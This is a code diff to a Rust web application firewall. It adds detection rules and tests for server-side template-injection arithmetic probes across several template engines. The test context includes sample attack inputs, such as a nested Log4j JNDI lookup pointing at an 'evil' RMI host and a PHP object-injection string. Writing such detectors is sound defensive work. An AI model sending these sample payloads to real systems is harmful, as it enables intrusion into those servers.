@@ -880,6 +880,15 @@ pub fn starter_rules() -> Vec<Rule> {
 		Rule { id: "code_php_object_inject", category: WafCategory::CodeInjection, pattern: r#"(?i)\b[oc]:\d+:"[a-z0-9_\\]+":\d+:\{"# },
 		Rule { id: "code_ssti_arithmetic", category: WafCategory::CodeInjection, pattern: r"\$\{\s*\d+\s*[*]\s*\d+\s*\}" },
 		Rule { id: "code_ssti_template", category: WafCategory::CodeInjection, pattern: r"\{\{\s*\d+\s*[*]\s*\d+\s*\}\}" },
+		// Server-side template-injection arithmetic probes across more engines than the `${}`/`{{}}`
+		// pair above — the `N*N` polyglot tplmap uses to fingerprint an SSTI-to-RCE sink: ERB/EJS/ASP
+		// `<%= 7*7 %>`, Ruby/Pug/Slim `#{7*7}`, Razor `@(7*7)`, and Thymeleaf `*{7*7}`. Requiring
+		// digit-times-digit *inside* the engine delimiters keeps false positives near zero (a CSS
+		// `#{$var}` interpolation or an email `@(handle)` carries no `\d+\*\d+`).
+		Rule { id: "code_ssti_erb", category: WafCategory::CodeInjection, pattern: r"<%[=\-]?\s*\d+\s*[*]\s*\d+\s*[-]?%>" },
+		Rule { id: "code_ssti_hash_delim", category: WafCategory::CodeInjection, pattern: r"#\{\s*\d+\s*[*]\s*\d+\s*\}" },
+		Rule { id: "code_ssti_razor", category: WafCategory::CodeInjection, pattern: r"@\(\s*\d+\s*[*]\s*\d+\s*\)" },
+		Rule { id: "code_ssti_thymeleaf", category: WafCategory::CodeInjection, pattern: r"\*\{\s*\d+\s*[*]\s*\d+\s*\}" },
 		Rule { id: "code_java_serialized", category: WafCategory::CodeInjection, pattern: r"rO0AB[A-Za-z0-9+/=]{2,}" },
 		// Double-extension upload filename (the file-upload RCE vector behind CVE-2026-33691): a
 		// benign-looking media/document/archive extension immediately followed by a *trailing*
@@ -1743,6 +1752,27 @@ mod tests {
 		assert_eq!(waf.inspect_str("x=${${lower:j}ndi:rmi://evil}", "query").unwrap().rule_id, "code_log4j_nested_lookup");
 		assert_eq!(waf.inspect_str(r#"data=O:8:"Exploit":1:{s:3:"cmd"}"#, "query").unwrap().rule_id, "code_php_object_inject");
 		assert_eq!(waf.inspect_str("tpl=${7*7}", "query").unwrap().rule_id, "code_ssti_arithmetic");
+	}
+
+	#[test]
+	fn ssti_engine_probes_match() {
+		// The extended SSTI arithmetic probes each fingerprint their engine and attribute to
+		// CodeInjection: ERB/EJS, Ruby/Pug, Razor, Thymeleaf.
+		let waf = Waf::starter();
+		assert_eq!(waf.inspect_str("v=<%= 7*7 %>", "query").unwrap().rule_id, "code_ssti_erb");
+		assert_eq!(waf.inspect_str("v=#{7*7}", "query").unwrap().rule_id, "code_ssti_hash_delim");
+		assert_eq!(waf.inspect_str("v=@(7*7)", "query").unwrap().rule_id, "code_ssti_razor");
+		assert_eq!(waf.inspect_str("v=*{7*7}", "query").unwrap().rule_id, "code_ssti_thymeleaf");
+	}
+
+	#[test]
+	fn ssti_engine_probes_keep_false_positives_low() {
+		// Engine delimiters without a `digit*digit` arithmetic probe stay clean: a CSS/Sass
+		// interpolation, an @-handle, a plain hash-braced variable.
+		let waf = Waf::starter();
+		for uri in ["/style?tpl=color:%23{$brand}", "/u/@(alice)", "/i18n?msg=%23{greeting}"] {
+			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
+		}
 	}
 
 	#[test]
